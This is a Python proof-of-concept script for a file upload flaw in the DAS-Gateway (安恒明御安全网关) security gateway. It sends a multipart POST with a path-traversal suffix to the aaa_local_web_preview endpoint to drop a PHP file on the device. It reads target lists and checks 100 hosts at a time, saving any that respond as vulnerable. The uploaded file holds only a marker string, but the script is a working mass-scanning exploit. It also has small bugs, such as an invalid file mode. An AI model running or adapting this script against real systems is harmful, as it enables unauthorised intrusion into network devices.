#安恒明御安全网关aaa_local_web_preview文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="安恒明御安全网关aaa_local_web_preview文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
def poc(target):
    payload_url = "/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php "
    url = target+payload_url
    headers={
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive"
    }
    data = (        
        '--849978f98abe41119122148e4aa65b1a\r\n'
        'Content-Disposition: form-data; name="123"; filename="test.php"\r\n'
        'Content-Type: text/plain\r\n'
        '\r\n'
        'This page has a vulnerability\r\n'
        '--849978f98abe41119122148e4aa65b1a--'
      )
    proxies = {
         'http':'http://127.0.0.1:8080',
         'https':'http://127.0.0.1:8080'
    }

    try:
        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,verify=False,timeout=10)
        if res.status_code ==200 and 'success' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','W',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else:
            print(f"该url不存在漏洞{target}")
    except Exception as e:
        print(f"该url存在问题{target}"+e)
if __name__ == '__main__':
    main()